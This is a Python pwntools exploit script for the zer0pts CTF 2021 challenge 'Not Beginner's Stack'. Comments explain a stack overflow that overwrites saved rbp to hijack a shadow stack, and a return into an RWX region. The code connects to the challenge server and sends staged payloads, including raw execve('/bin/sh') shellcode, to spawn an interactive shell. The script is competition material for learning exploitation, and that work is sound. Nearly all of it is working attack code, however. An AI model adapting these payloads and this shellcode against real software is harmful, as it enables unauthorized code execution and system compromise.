# zer0pts CTF 2021 - Not Beginner's Stack
# Exploit strategy:
# 1. We use the 'vuln' stack-overflow in order to overwrite saved-rbp.
# 2. We set saved-rbp so the read in the 'notvuln' function will let
#    us control the shadow-stack depth and contents.
#    We use the shadow-stack to return to 'notvuln', and make it return
#    to the address of the RWX region (in address 0x00600000) upon finishing
#    execution.
# 3. We use the second execution of 'notvuln' in order to fill the RWX
#    region with our own shellcode.
# 4. Upon return of the (second) 'notvuln' into the RWX region - our shellcode
#    will be executed.
from pwn import *

# p = process("./chall")
# gdb.attach(p)
p = remote("pwn.ctf.zer0pts.com", 9011)

STACK_DEPTH_ADDR = 0x000000000060022e
RWX_REGION = 0x00600000
LEAVE_GADGET = 0x4001d4
NOTVULN_ADDR = 0x00000000004000eb
EXECVE_BIN_SH_SHELLCODE = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

## Stage 1 - control shadow stack
# Overwrite saved-rbp in "vuln" function
p.recvuntil(b"Data: ")
p.send(0x100 * b"a" + p64(STACK_DEPTH_ADDR + 0x100))

# We overwrite the SS-depth and the SS itself
# We will resume execution to "notvuln" function, and upon return - it will
# return to the RWX region address
wanted_depth = 2
wanted_stack = 2 * b"a" + p64(RWX_REGION) + p64(NOTVULN_ADDR)
p.recvuntil(b"Data: ")
p.send(p32(wanted_depth) + wanted_stack)

## Stage 2 - fill RWX region
# Overwrite saved-rbp again - now with RWX_REGION address
p.recvuntil(b"Data: ")
p.send(0x100 * b"a" + p64(RWX_REGION + 0x100))
# Send shellcode to this area (just execve("/bin/sh") x64 shellcode)
p.recvuntil(b"Data: ")
p.send(EXECVE_BIN_SH_SHELLCODE)

p.interactive()
